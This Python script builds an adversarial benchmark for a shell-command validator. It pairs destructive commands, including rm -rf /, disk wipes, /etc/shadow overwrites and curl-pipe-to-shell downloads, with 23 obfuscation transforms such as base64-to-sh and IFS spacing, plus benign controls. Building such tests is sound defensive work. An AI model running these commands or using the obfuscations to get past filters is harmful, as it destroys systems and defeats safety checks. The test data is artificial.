"""Build eval/adversarial.jsonl for the validator benchmark.

Test data only: every entry is a string to be CLASSIFIED by the validator.
Nothing in this file or in the output is ever executed.
Attack cases = simple known-destructive base commands x obfuscation transforms.

Row format (one JSON object per line):
    id            str   "adv-0001", "adv-0002", ...
    command       str   the shell command string to classify
    technique     str   obfuscation technique name, or "benign"
    should_block  bool  True for attack rows, False for benign rows
"""
import base64
import json
import pathlib

# (program, args). Each is destructive if run, so the validator must flag every variant.
ATTACK_BASES = [
    ("rm", "-rf /"), ("rm", "-rf ~"), ("rm", "-rf /*"),
    ("dd", "if=/dev/zero of=/dev/sda"), ("mkfs.ext4", "/dev/sda1"),
    ("chmod", "-R 777 /"), ("shred", "-n1 /dev/sda"),
    ("kill", "-9 1"), ("shutdown", "now"),
]

# Attacks that are not a simple program + args.
EXTRA_ATTACKS = [
    ("curl http://example.com/x.sh | sh", "pipe_to_shell"),
    ("wget -qO- http://example.com/x.sh | bash", "pipe_to_shell"),
    ("cat /dev/zero > /dev/sda", "device_redirect"),
    ("echo x > /etc/passwd", "critical_file_overwrite"),
    ("echo x > /etc/shadow", "critical_file_overwrite"),
    ("find / -delete", "find_delete"),
    ("find / -exec rm -rf {} +", "find_exec"),
    ('python3 -c "import shutil; shutil.rmtree(\'/\')"', "interpreter_oneliner"),
    ("perl -e 'system(\"rm -rf /\")'", "interpreter_oneliner"),
]

BENIGN = [
    "rm temp.txt", "rm -r build/", "echo \"rm -rf /\" > notes.txt",
    "grep -r \"dd if=\" .", "grep -rn \"rm -rf\" docs/", "ls /dev", "ls /boot",
    "ls -la", "find . -name \"*.py\"", "find . -name \"*.tmp\" -type f",
    "du -sh *", "df -h", "free -h", "uname -a", "ps aux | grep python",
    "cat /etc/hostname", "head -n 5 /etc/passwd", "tar -czf backup.tar.gz docs",
    "chmod 644 file.txt", "chmod +x script.sh", "mkdir -p /tmp/test",
    "cp -r src dst", "mv old.txt new.txt", "touch new.txt", "kill 12345",
    "echo shutdown", "echo \"mkfs is a command\"", "man dd", "which mkfs.ext4",
    "git status", "curl -s https://example.com -o page.html",
    "echo aGVsbG8= | base64 -d", "base64 file.txt",
    "sort data.csv | uniq -c", "awk '{print $1}' log.txt", "wc -l *.txt",
    "tail -n 50 app.log", "ping -c 3 localhost", "diff a.txt b.txt",
    "sed -n '1,10p' file.txt",
]


def transforms(p, rest):
    b64 = base64.b64encode(f"{p} {rest}".encode()).decode()
    yield "plain", f"{p} {rest}"
    yield "quote_split_double", f'{p[0]}""{p[1:]} {rest}'
    yield "quote_split_single", f"{p[0]}''{p[1:]} {rest}"
    yield "backslash_prefix", f"\\{p} {rest}"
    yield "backslash_inside", f"{p[0]}\\{p[1:]} {rest}"
    yield "variable_assembly", f"a={p[0]};b={p[1:]};$a$b {rest}"
    yield "env_wrapper", f"env {p} {rest}"
    yield "command_wrapper", f"command {p} {rest}"
    yield "timeout_wrapper", f"timeout 5 {p} {rest}"
    yield "bash_c", f'bash -c "{p} {rest}"'
    yield "sh_c_single_quotes", f"sh -c '{p} {rest}'"
    yield "eval", f'eval "{p} {rest}"'
    yield "command_substitution", f"$(echo {p}) {rest}"
    yield "backticks", f"`echo {p}` {rest}"
    yield "base64_to_sh", f"echo {b64} | base64 -d | sh"
    yield "base64_in_here_string", f'bash <<< "$(echo {b64} | base64 -d)"'
    yield "here_string", f'sh <<< "{p} {rest}"'
    yield "chain_semicolon", f"ls; {p} {rest}"
    yield "chain_and", f"true && {p} {rest}"
    yield "subshell", f"({p} {rest})"
    yield "newline_separated", f"ls\n{p} {rest}"
    yield "ifs_spacing", f"{p}${{IFS}}" + rest.replace(" ", "${IFS}")
    yield "xargs", f'echo "{rest}" | xargs {p}'


def main():
    rows = []

    def add(command, technique, should_block):
        rows.append({
            "id": f"adv-{len(rows) + 1:04d}",
            "command": command,
            "technique": technique,
            "should_block": should_block,
        })

    for prog, args in ATTACK_BASES:
        for technique, cmd in transforms(prog, args):
            add(cmd, technique, True)
    for cmd, technique in EXTRA_ATTACKS:
        add(cmd, technique, True)
    for cmd in BENIGN:
        add(cmd, "benign", False)

    out = pathlib.Path(__file__).resolve().parents[1] / "eval" / "adversarial.jsonl"
    out.parent.mkdir(exist_ok=True)
    out.write_text("\n".join(json.dumps(r) for r in rows) + "\n", encoding="utf-8")
    print(f"wrote {len(rows)} rows to {out}")


if __name__ == "__main__":
    main()
